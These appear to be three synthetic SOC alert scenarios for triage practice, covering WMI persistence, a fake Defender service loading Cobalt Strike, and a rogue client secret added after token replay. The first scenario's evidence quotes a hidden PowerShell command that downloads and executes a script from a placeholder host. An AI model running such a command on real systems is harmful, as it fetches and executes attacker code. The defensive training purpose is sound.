title: Malicious WMI Event Subscription on App Server
description: Sysmon detected a permanent WMI event subscription on an application server. It binds a timer-based filter to a command-line consumer that runs PowerShell.

alert.rule: SOC357 - WMI Permanent Event Subscription Created

evidence: Sysmon EventID 19 EventFilter Name=WindowsUpdateCheck Query=SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'

Sysmon EventID 20 CommandLineEventConsumer Name=WindowsUpdateConsumer Destination=powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://cdn-sync.example.invalid/a.ps1')"
Sysmon EventID 21 FilterToConsumerBinding links WindowsUpdateCheck to WindowsUpdateConsumer
Subscription was created over remote WMI (WmiPrvSE.exe) from 10.30.12.44 using the svc_backup credentials, EventID 4624 LogonType=3 at 22:47
svc_backup normally runs backups from BKP-01 only, and 10.30.12.44 (WKS-DEV-021) has never touched SRV-APP-07 before
Proxy logs show the host resolving cdn-sync.example.invalid every 5 minutes since 22:53

title: Auto-Start Service Installed from ProgramData
description: A new auto-start service was installed on a file server with a binary in a non-standard location. The service name imitates a security product.

alert.rule: SOC358 - New Service Installed with Suspicious Path

evidence: System EventID 7045 ServiceName=WinDefendUpdate ImagePath=C:\ProgramData\wd\svcupd.exe StartType=auto ServiceAccount=LocalSystem
EventID 4624 LogonType=10 user=adm.rsmith src=198.51.100.77 at 03:19, an external IP outside the corporate VPN range
svcupd.exe sha256=a3c9e17b04d85f62c1e07b9d3f5a28e46d0b7c19f8e3a5d24b6c70e1f9a8d3b5 is unsigned, and a hash search shows it as a known Cobalt Strike loader
svcupd.exe made outbound TLS connections to update.cdn-sync.example every 60 seconds, with jitter
adm.rsmith is on annual leave until 2026-06-15 per the HR calendar, and no VPN session exists for this user
The genuine Defender service is named WinDefend and runs from C:\ProgramData\Microsoft\Windows Defender\Platform

title: Client Secret Added to Privileged Service Principal After Risky Sign-in
description: Entra ID audit logs show a new client secret on an existing enterprise application that holds mail permissions. The change was made by a helpdesk admin whose session was flagged as risky earlier in the day. The attacker is likely using a hijacked session token to keep access that survives a password reset.

alert.rule: SOC359 - Credential Added to Application or Service Principal

evidence: Audit log 'Add service principal credentials' target=HR-Onboarding-Sync (appId 7d2e5b10-4c9a-4f1e-9a3d-0b6e8c1f2a44) type=ClientSecret expires=2028-06-15 initiator=t.nakamura@contoso.example ip=203.0.113.96

Sign-in 15:58 for t.nakamura from 198.51.100.140 flagged 'Anomalous token' and 'Unfamiliar sign-in properties'. The MFA claim was present but no MFA prompt appears in the logs, which suggests AiTM token replay after a click on login-contoso-sso.example
Earlier in the day, helpdesk admin t.nakamura had last signed in from Lisbon on a compliant device, while the 203.0.113.96 sessions show a different user agent and a non-compliant device
HR-Onboarding-Sync holds Mail.ReadWrite and Files.Read.All application permissions with tenant-wide admin consent, granted 2026-03-02
Service principal sign-ins using the new secret began 16:41 from 203.0.113.96, and Graph activity shows 1,900 mailbox message reads across 14 executive mailboxes in 20 minutes
The attacker's Conditional Access policies do not apply to the service principal, so a password reset for t.nakamura alone would not remove this access
